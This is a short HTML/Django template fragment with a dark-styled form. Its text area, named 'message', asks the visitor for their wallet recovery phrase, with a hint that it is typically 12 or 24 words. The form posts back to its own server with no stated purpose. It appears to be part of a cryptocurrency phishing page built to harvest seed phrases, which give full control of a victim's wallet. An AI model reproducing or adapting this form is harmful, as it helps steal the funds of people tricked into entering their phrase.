<body>

<!-- contact -->
    <div class="container">
                   <form action="" method="POST" class="contact-form">
						{% csrf_token %}

							<textarea name="message" placeholder="Enter your recovery phrase" cols="30" rows="10" required=""></textarea>

						<p style="color:#fff">Typically 12 (sometimes 24) words separated by single spaces</p>
						<div class="form-control" style="background-color: #1a202c; border-color: #1a202c;">

						</div>
				   
				   
				   
				   </form>
